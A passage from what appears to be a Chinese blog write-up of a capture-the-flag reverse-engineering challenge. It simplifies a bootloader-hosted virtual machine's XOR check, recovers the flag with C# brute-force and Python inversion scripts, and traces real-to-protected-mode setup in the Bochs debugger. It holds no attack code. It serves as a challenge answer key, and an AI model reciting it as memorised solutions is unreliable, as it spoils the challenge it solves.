<span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '146')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'right'</span></span><br></pre></td></tr></table></figure><p>人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">129</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    code[i] = code[i] ^ (code[i] &lt;&lt; <span class="number">8</span>) ^ (code[i] &lt;&lt; <span class="number">16</span>) ^ (code[i] &lt;&lt; <span class="number">24</span>) ^ code[i - <span class="number">1</span>] ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i - <span class="number">138</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> code[<span class="number">138</span> + i] - code[<span class="number">129</span> + i] != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'right'</span></span><br></pre></td></tr></table></figure><p>这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace Solve &#123;</span><br><span class="line">class Program &#123;</span><br><span class="line">public static byte[] intToBytes(uint value) &#123;</span><br><span class="line">byte[] res = new byte[4];</span><br><span class="line">res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">res[0] = (byte) (value &amp; 0xFF);</span><br><span class="line">return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static string asciiToString(byte[] array) &#123;</span><br><span class="line">return Convert.ToString(System.Text.Encoding.ASCII.GetString(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void Main(string[] args) &#123;</span><br><span class="line">var data = new uint[] &#123;</span><br><span class="line">0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff</span><br><span class="line">&#125;;</span><br><span class="line">var ans = new uint[data.Length];</span><br><span class="line">var patch = new byte[data.Length * 4];</span><br><span class="line">for(uint i = 0; i &lt; 9; i++) &#123;</span><br><span class="line">uint t = 0;</span><br><span class="line">for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) &#123;</span><br><span class="line">t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24);</span><br><span class="line">if(i &gt; 0) &#123;</span><br><span class="line">t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24);</span><br><span class="line">&#125;</span><br><span class="line">if(t == data[i + 9]) &#123; // 0x57635565</span><br><span class="line">ans[i] = j;</span><br><span class="line">patch[4 * i] = intToBytes(j)[0];</span><br><span class="line">patch[4 * i + 1] = intToBytes(j)[1];</span><br><span class="line">patch[4 * i + 2] = intToBytes(j)[2];</span><br><span class="line">patch[4 * i + 3] = intToBytes(j)[3];</span><br><span class="line">Console.WriteLine(&quot;0x&#123;0:X8&#125;&quot;, j);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">string flag = asciiToString(patch);</span><br><span class="line">Console.WriteLine(flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然在已知数据的情况下也可以直接逆回来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">data = [<span class="number">0x57635565</span>, <span class="number">0x06530401</span>, <span class="number">0x1F494949</span>, <span class="number">0x5157071F</span>, <span class="number">0x575F4357</span>, <span class="number">0x57435E57</span>, <span class="number">0x4357020A</span>, <span class="number">0x575E035E</span>, <span class="number">0x0F590000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFF</span>))[::<span class="number">-1</span>]</span><br><span class="line">    data[i + <span class="number">1</span>] = data[i] ^ data[i + <span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h1><p>这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:1&gt; b 0x7c00</span><br><span class="line">&lt;bochs:2&gt; c</span><br><span class="line">00000004662i[BIOS  ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $</span><br><span class="line">00000318050i[KBD   ] reset-disable command received</span><br><span class="line">00000320819i[BIOS  ] Starting rombios32</span><br><span class="line">00000321257i[BIOS  ] Shutdown flag 0</span><br><span class="line">00000321840i[BIOS  ] ram_size=0x02000000</span><br><span class="line">00000322261i[BIOS  ] ram_end=32MB</span><br><span class="line">00000362829i[BIOS  ] Found 1 cpu(s)</span><br><span class="line">00000376413i[BIOS  ] bios_table_addr: 0x000f9cd8 end=0x000fcc00</span><br><span class="line">00000704208i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)</span><br><span class="line">00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b</span><br><span class="line">00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x09</span><br><span class="line">00001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b</span><br><span class="line">00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x09</span><br><span class="line">00001032204i[P2ISA ] write: ELCR2 = 0x0a</span><br><span class="line">00001032974i[BIOS  ] PIIX3/PIIX4 init: elcr=00 0a</span><br><span class="line">00001040697i[BIOS  ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x0600</span><br><span class="line">00001042976i[BIOS  ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x0601</span><br><span class="line">00001045094i[BIOS  ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x0101</span><br><span class="line">00001045323i[PIDE  ] new BM-DMA address: 0xc000</span><br><span class="line">00001045939i[BIOS  ] region 4: 0x0000c000</span><br><span class="line">00001047953i[BIOS  ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c03</span><br><span class="line">00001048157i[UHCI  ] new base address: 0xc020</span><br><span class="line">00001048773i[BIOS  ] region 4: 0x0000c020</span><br><span class="line">00001048901i[UHCI  ] new irq line = 9</span><br><span class="line">00001050796i[BIOS  ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x0680</span><br><span class="line">00001051028i[ACPI  ] new irq line = 11</span><br><span class="line">00001051040i[ACPI  ] new irq line = 9</span><br><span class="line">00001051065i[ACPI  ] new PM base address: 0xb000</span><br><span class="line">00001051079i[ACPI  ] new SM base address: 0xb100</span><br><span class="line">00001051107i[PCI   ] setting SMRAM control register to 0x4a</span><br><span class="line">00001215200i[CPU0  ] Enter to System Management Mode</span><br><span class="line">00001215200i[CPU0  ] enter_system_management_mode: temporary disable VMX while in SMM mode</span><br><span class="line">00001215210i[CPU0  ] RSM: Resuming from System Management Mode</span><br><span class="line">00001379231i[PCI   ] setting SMRAM control register to 0x0a</span><br><span class="line">00001394138i[BIOS  ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc8</span><br><span class="line">00001395960i[BIOS  ] SMBIOS table addr=0x000f9dc0</span><br><span class="line">00001398141i[BIOS  ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf72</span><br><span class="line">00001401353i[BIOS  ] Firmware waking vector 0x1ff00cc</span><br><span class="line">00001403148i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)</span><br><span class="line">00001403871i[BIOS  ] bios_table_cur_addr: 0x000f9f04</span><br><span class="line">00001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $</span><br><span class="line">00001531559i[BXVGA ] VBE known Display Interface b0c0</span><br><span class="line">00001531591i[BXVGA ] VBE known Display Interface b0c5</span><br><span class="line">00001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $</span><br><span class="line">00014040189i[BIOS  ] Booting from 0000:7c00</span><br><span class="line">(0) Breakpoint 1, 0x0000000000007c00 in ?? ()</span><br><span class="line">Next at t=14040244</span><br><span class="line">(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005          ; ea0500c007</span><br></pre></td></tr></table></figure><p>可以用 <code>show mode</code> 命令来显示实模式向保护模式的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:3&gt; show mode</span><br><span class="line">show mode switch: ON</span><br><span class="line">show mask is: mode</span><br></pre></td></tr></table></figure><p>利用 <code>u</code> 命令来查看汇编代码，这里是实模式的部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:7&gt; u/40 0x7c00</span><br><span class="line">00007c00: (                    ): jmpf 0x07c0:0005          ; ea0500c007</span><br><span class="line">00007c05: (                    ): mov ax, cs                ; 8cc8</span><br><span class="line">00007c07: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c09: (                    ): mov ss, ax                ; 8ed0</span><br><span class="line">00007c0b: (                    ): mov sp, 0x0400            ; bc0004</span><br><span class="line">00007c0e: (                    ): cld                       ; fc</span><br><span class="line">00007c0f: (                    ): mov ax, 0x0003            ; b80300</span><br><span class="line">00007c12: (                    ): int 0x10                  ; cd10</span><br><span class="line">00007c14: (                    ): mov dx, 0x0000            ; ba0000</span><br><span class="line">00007c17: (                    ): mov cx, 0x0002            ; b90200</span><br><span class="line">00007c1a: (                    ): mov ax, 0x1000            ; b80010</span><br><span class="line">00007c1d: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00007c1f: (                    ): xor bx, bx                ; 31db</span><br><span class="line">00007c21: (                    ): mov ax, 0x0228            ; b82802</span><br><span class="line">00007c24: (                    ): int 0x13                  ; cd13</span><br><span class="line">00007c26: (                    ): jnb .+2                   ; 7302</span><br><span class="line">00007c28: (                    ): jmp .-2                   ; ebfe</span><br><span class="line">00007c2a: (                    ): cli                       ; fa</span><br><span class="line">00007c2b: (                    ): mov ax, 0x1000            ; b80010</span><br><span class="line">00007c2e: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c30: (                    ): xor ax, ax                ; 31c0</span><br><span class="line">00007c32: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00007c34: (                    ): mov cx, 0x2000            ; b90020</span><br><span class="line">00007c37: (                    ): sub si, si                ; 29f6</span><br><span class="line">00007c39: (                    ): sub di, di                ; 29ff</span><br><span class="line">00007c3b: (                    ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a4</span><br><span class="line">00007c3d: (                    ): mov ax, 0x07c0            ; b8c007</span><br><span class="line">00007c40: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c42: (                    ): lidt ds:0x006f            ; 0f011e6f00</span><br><span class="line">00007c47: (                    ): lgdt ds:0x0075            ; 0f01167500</span><br><span class="line">00007c4c: (                    ): mov ax, 0x0001            ; b80100</span><br><span class="line">00007c4f: (                    ): lmsw ax                   ; 0f01f0</span><br><span class="line">00007c52: (                    ): jmpf 0x0008:0000          ; ea00000800</span><br></pre></td></tr></table></figure><p>在指令 <code>lmsw ax</code> 处看到实模式向保护模式的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:39&gt; n</span><br><span class="line">Next at t=15885325</span><br><span class="line">(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax                   ; 0f01f0</span><br><span class="line">&lt;bochs:40&gt;</span><br><span class="line">00015885326: switched from &apos;real mode&apos; to &apos;protected mode&apos;</span><br><span class="line">Next at t=15885326</span><br><span class="line">(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000          ; ea00000800</span><br></pre></td></tr></table></figure><p>保护模式的前一段部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:42&gt; u/20 0x00</span><br><span class="line">00000000: (                    ): mov eax, 0x00000010       ; b810000000</span><br><span class="line">00000005: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00000007: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b0000</span><br><span class="line">0000000e: (                    ): call .+120                ; e878000000</span><br><span class="line">00000013: (                    ): call .+107                ; e86b000000</span><br><span class="line">00000018: (                    ): mov eax, 0x00000010       ; b810000000</span><br><span class="line">0000001d: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">0000001f: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00000021: (                    ): mov fs, ax                ; 8ee0</span><br><span class="line">00000023: (                    ): mov gs, ax                ; 8ee8</span><br><span class="line">00000025: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b0000</span><br><span class="line">0000002c: (                    ): xor ebx, ebx              ; 31db</span><br></pre></td></tr></table></figure><p>IDTR 的初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:39&gt; u/20 0x8b</span><br><span class="line">0000008b: (                    ): mov edx, 0x000000fc       ; bafc000000</span><br><span class="line">00000090: (                    ): mov eax, 0x00080000       ; b800000800</span><br><span class="line">00000095: (                    ): mov ax, dx                ; 6689d0</span><br><span class="line">00000098: (                    ): mov dx, 0x8e00            ; 66ba008e</span><br><span class="line">0000009c: (                    ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000</span><br><span class="line">000000a2: (                    ): mov ecx, 0x00000100       ; b900010000</span><br><span class="line">000000a7: (                    ): mov dword ptr ds:[edi], eax ; 8907</span><br><span class="line">000000a9: (                    ): mov dword ptr ds:[edi+4], edx ; 895704</span><br><span class="line">000000ac: (                    ): add edi, 0x00000008       ; 83c708</span><br><span class="line">000000af: (                    ): dec ecx                   ; 49</span><br><span class="line">000000b0: (                    ): jnz .-11                  ; 75f5</span><br><span class="line">000000b2: (                    ): lidt ds:0x0000011c        ; 0f011d1c010000</span><br><span class="line">000000b9: (                    ): ret                       ; c3</span><br></pre></td></tr></table></figure><p>GDTR 的初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:68&gt; u/10 0x83</span><br><span class="line">00000083: (                    ): lgdt ds:0x00000122        ; 0f011522010000</span><br><span class="line">0000008a: (                    ): ret                       ; c3</span><br></pre></td></tr></table></figure><p>用 <code>sreg</code> 命令可以看到 GDTR 和 IDTR 寄存器被初始化了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:75&gt; sreg</span><br><span class="line">es:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">cs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1</span><br><span class="line">Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bit</span><br><span class="line">ss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessed</span><br><span class="line">ds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessed</span><br><span class="line">fs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">gs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">ldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1</span><br><span class="line">tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1</span><br><span class="line">gdtr:base=0x0000000000000928, limit=0x1f</span><br><span class="line">idtr:base=0x0000000000000128, limit=0x7ff</span><br></pre></td></tr></table></figure><p>最后是虚拟机指令部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:43&gt; u/110 0xb7c</span><br><span class="line">00000b7c: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000b83: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000b85: (                    ): jmp .+366                 ; e96e010000</span><br><span class="line">00000b8a: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000b91: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000b93: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000b9a: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000b9c: (                    ): jmp .+343                 ; e957010000</span><br><span class="line">00000ba1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000ba8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000baa: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bb1: (                    ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d0000</span><br><span class="line">00000bb8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000bba: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bbc: (                    ): jmp .+311                 ; e937010000</span><br><span class="line">00000bc1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000bc8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000bca: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bd1: (                    ): mov ecx, dword ptr ds:[ecx] ; 8b09</span><br><span class="line">00000bd3: (                    ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d0000</span><br><span class="line">00000bda: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bdc: (                    ): jmp .+279                 ; e917010000</span><br><span class="line">00000be1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000be8: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000bea: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bf1: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000bf3: (                    ): add eax, edx              ; 01d0</span><br><span class="line">00000bf5: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bf7: (                    ): jmp .+252                 ; e9fc000000</span><br><span class="line">00000bfc: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c03: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000c05: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c0c: (                    ): mov eax, 